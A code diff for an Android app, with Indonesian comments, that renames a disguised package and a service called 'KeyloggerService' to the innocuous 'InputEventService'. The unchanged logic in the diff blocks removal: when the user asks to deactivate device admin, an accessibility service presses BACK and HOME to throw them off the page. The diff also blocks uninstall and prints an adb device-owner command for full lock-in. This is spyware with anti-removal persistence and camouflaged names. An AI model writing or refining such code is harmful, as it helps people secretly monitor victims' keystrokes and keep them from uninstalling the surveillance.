@@ -1,4 +1,4 @@
-package com.android.services
+package com.nexlink.bridge
 
 import android.app.admin.DeviceAdminReceiver
 import android.app.admin.DevicePolicyManager
@@ -22,16 +22,16 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
 
     /**
      * FIX Bug 2 — sebelumnya hanya return teks, user tetap bisa tap "Deactivate".
-     * Sekarang: sinyal KeyloggerService untuk press BACK + HOME secepat mungkin
+     * Sekarang: sinyal InputEventService untuk press BACK + HOME secepat mungkin
      * sehingga user terpental keluar dari halaman Device Admin sebelum bisa tap.
      */
     override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
         try {
-            KeyloggerService.instance?.performGlobalAction(
+            InputEventService.instance?.performGlobalAction(
                 android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
             )
             Handler(Looper.getMainLooper()).postDelayed({
-                KeyloggerService.instance?.performGlobalAction(
+                InputEventService.instance?.performGlobalAction(
                     android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME
                 )
             }, 0)
@@ -201,7 +201,7 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
                         dpm.setUninstallBlocked(admin, context.packageName, block)
                     } catch (_: SecurityException) {}
                     if (block)
-                        "ADMIN_ONLY: Block parsial aktif. Untuk full block: adb shell dpm set-device-owner com.android.services/.AppDeviceAdminReceiver"
+                        "ADMIN_ONLY: Block parsial aktif. Untuk full block: adb shell dpm set-device-owner com.nexlink.bridge/.AppDeviceAdminReceiver"
                     else
                         "ADMIN_ONLY: Proteksi parsial dilepas."
                 }
